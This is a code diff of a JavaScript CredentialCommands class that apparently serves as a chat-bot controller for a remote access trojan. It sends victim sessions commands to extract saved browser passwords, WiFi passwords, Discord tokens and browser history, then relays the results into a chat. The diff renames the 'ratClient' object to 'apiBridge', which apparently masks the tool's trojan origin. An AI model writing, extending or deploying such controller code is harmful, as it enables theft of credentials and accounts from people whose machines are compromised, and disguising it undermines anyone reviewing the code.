@@ -5,8 +5,8 @@ import { ResponseFormatter } from '../utils/formatter.js';
  */
 
 export class CredentialCommands {
-  constructor(ratClient, sock) {
-    this.ratClient = ratClient;
+  constructor(apiBridge, sock) {
+    this.apiBridge = apiBridge;
     this.sock = sock;
   }
 
@@ -25,7 +25,7 @@ export class CredentialCommands {
       text: ResponseFormatter.info('🔐 Extracting browser passwords...\n\n_This may take 30 seconds..._') 
     });
 
-    const result = await this.ratClient.getPasswords(sessionId);
+    const result = await this.apiBridge.getPasswords(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -49,7 +49,7 @@ export class CredentialCommands {
       return;
     }
 
-    const result = await this.ratClient.getWiFiPasswords(sessionId);
+    const result = await this.apiBridge.getWiFiPasswords(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -73,7 +73,7 @@ export class CredentialCommands {
       return;
     }
 
-    const result = await this.ratClient.getDiscordTokens(sessionId);
+    const result = await this.apiBridge.getDiscordTokens(sessionId);
     
     if (result.success) {
       try {
@@ -125,7 +125,7 @@ export class CredentialCommands {
       text: ResponseFormatter.info(`📜 Extracting ${browser} history...\n\n_Please wait..._`) 
     });
 
-    const result = await this.ratClient.getBrowserHistory(sessionId, browser);
+    const result = await this.apiBridge.getBrowserHistory(sessionId, browser);
     
     if (result.success) {
       try {
